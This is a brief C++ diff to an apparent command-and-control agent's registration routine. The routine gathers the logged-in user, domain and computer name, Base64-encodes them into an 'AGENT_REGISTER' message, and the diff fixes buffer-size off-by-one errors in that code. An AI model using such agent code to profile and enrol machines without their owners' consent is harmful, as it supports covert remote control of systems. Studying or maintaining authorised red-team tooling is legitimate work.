@@ -41,6 +41,7 @@ void BaseCommunicator::QueueRegistrationDataAsFirstAgentOutput()
     LPVOID pFqdnComputerB64 = NULL;
     LPVOID pDomainAndUserNameB64 = NULL;
     LPVOID pDomainAndUserName = NULL;
+    LPVOID pRegistrationData = NULL;
 
     // Get logged-in username and hostname of computer, then concat them
     this->pWinApiCustom->GetUserNameCustom(&pUserName, &pDomainName);
@@ -62,8 +63,8 @@ void BaseCommunicator::QueueRegistrationDataAsFirstAgentOutput()
     // Convert all necessary individual data into Base64
     DWORD fqdnComputerB64Len = (((fqdnComputerLen + 2) / 3) * 4);
     DWORD domainAndUserNameB64Len = (((domainAndUserNameLen + 2) / 3) * 4);
-    pFqdnComputerB64 = this->pWinApiCustom->HeapAllocCustom(fqdnComputerB64Len);
-    pDomainAndUserNameB64 = this->pWinApiCustom->HeapAllocCustom(domainAndUserNameB64Len);
+    pFqdnComputerB64 = this->pWinApiCustom->HeapAllocCustom(fqdnComputerB64Len + 1);
+    pDomainAndUserNameB64 = this->pWinApiCustom->HeapAllocCustom(domainAndUserNameB64Len + 1);
     if (pFqdnComputerB64 == NULL || pDomainAndUserNameB64 == NULL)
         goto CLEANUP;
     Base64Encode((PUCHAR)pFqdnComputer, fqdnComputerLen, (PCHAR)pFqdnComputerB64);
@@ -71,7 +72,7 @@ void BaseCommunicator::QueueRegistrationDataAsFirstAgentOutput()
 
     // Prepare registration data
     DWORD registrationDataSize = STRING_AGENT_REGISTER_LEN + 1 + StrLen(this->agentId) + 1 + fqdnComputerB64Len + 1 + domainAndUserNameB64Len + 1; // "AGENT_REGISTER" + "-" + "6 char agent id" + "-" + "HOSTNAME B64" + "-" + "DOMAIN/USERNAME B64" + "null-byte"
-    LPVOID pRegistrationData = this->pWinApiCustom->HeapAllocCustom(registrationDataSize);
+    pRegistrationData = this->pWinApiCustom->HeapAllocCustom(registrationDataSize);
     if (pRegistrationData == NULL)
         goto CLEANUP;
 
